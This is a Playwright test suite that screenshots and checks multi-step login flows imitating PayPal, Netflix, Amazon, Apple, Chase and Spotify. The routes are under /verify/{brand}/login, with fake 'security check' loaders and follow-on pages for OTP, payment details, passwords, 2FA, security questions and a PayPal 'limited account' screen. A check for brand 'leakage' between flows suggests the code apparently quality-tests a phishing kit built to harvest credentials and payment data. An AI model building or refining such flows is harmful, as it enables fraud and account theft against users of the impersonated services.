import { test, Page, expect } from '@playwright/test';

/**
 * Visual & Functional Integrity Audit
 * 
 * This suite visits every step of every flow to ensure:
 * 1. Correct flow routing
 * 2. Visual distinctiveness (no PayPal leakage)
 * 3. Functional progression (can move from step A to B)
 */

async function capture(page: Page, flow: string, step: string) {
    const filename = `audit-${flow}-${step}.png`;
    console.log(`[${flow}] Capturing ${step}...`);
    // Wait for network idle/animations
    await page.waitForLoadState('networkidle', { timeout: 5000 }).catch(() => { });
    await page.waitForTimeout(1000);
    await page.screenshot({ path: `e2e/screenshots/audit/${filename}`, fullPage: true });
}

test.describe('Ultra-Fidelity Flow Audit', () => {
    test.use({ viewport: { width: 1280, height: 800 } });

    const BRAND_FLOWS = [
        { id: 'paypal', loader: '.animate-spin-slow', bg: 'rgb(245, 247, 250)', next: 'otp' },
        { id: 'netflix', loader: '.netflix-red-spinner', bg: 'rgb(0, 0, 0)', next: 'payment' },
        { id: 'amazon', loader: '.amazon-spinner', bg: 'rgb(255, 255, 255)', next: 'password' },
        { id: 'apple', loader: '.apple-spinner', bg: 'rgb(255, 255, 255)', next: '2fa' },
        { id: 'chase', loader: '.chase-spinner', bg: 'rgb(17, 122, 202)', next: 'questions' },
        { id: 'spotify', loader: '.spotify-dots', bg: 'rgb(18, 18, 18)', next: 'success' }
    ];

    for (const flow of BRAND_FLOWS) {
        test(`Audit: ${flow.id.toUpperCase()} Flow Fidelity`, async ({ page }) => {
            console.log(`>>> Auditing Flow: ${flow.id}`);

            // 1. Initial Security Check
            await page.goto(`/verify/${flow.id}/login`);

            // Check for brand-specific security check loader
            const securityLoader = page.locator(flow.loader);
            await expect(securityLoader).toBeVisible({ timeout: 5000 });

            // Capture security check
            await capture(page, flow.id, '0-security-check');

            // 2. Login Page
            await page.waitForTimeout(2000); // Wait for security check to finish
            await expect(page.locator('input[name="email"], input[name="username"], input[name="appleId"]')).toBeVisible();
            await capture(page, flow.id, '1-login');

            // BRAND ISOLATION CHECK: Ensure no "SecureCheck" or PayPal logos if not paypal
            if (flow.id !== 'paypal') {
                const headerText = await page.innerText('body');
                expect(headerText).not.toContain('SecureCheck');
            }

            // Fill Login
            const emailField = page.locator('input[name="email"], input[name="username"], input[name="appleId"]').first();
            const passField = page.locator('input[name="password"]').first();

            await emailField.fill('audit@test.com');
            if (await passField.isVisible()) {
                await passField.fill('Password123!');
            }

            await page.locator('button[type="submit"], button.apple-submit-btn').first().click();

            // 3. Post-Login Loading Screen
            const postLoginLoader = page.locator(flow.loader);
            await expect(postLoginLoader).toBeVisible();
            await capture(page, flow.id, '2-loading-transition');

            // 4. Next Step Navigation
            // Each brand should NOT go to 'limited' (except Paypal/Default)
            await page.waitForTimeout(3000);
            const currentUrl = page.url();
            console.log(`[${flow.id}] Navigated to: ${currentUrl}`);

            if (flow.id === 'paypal') {
                expect(currentUrl).toContain('limited');
            } else {
                expect(currentUrl).not.toContain('limited');
                expect(currentUrl).toContain(flow.next);
            }

            await capture(page, flow.id, `3-next-step-${flow.next}`);
        });
    }
});

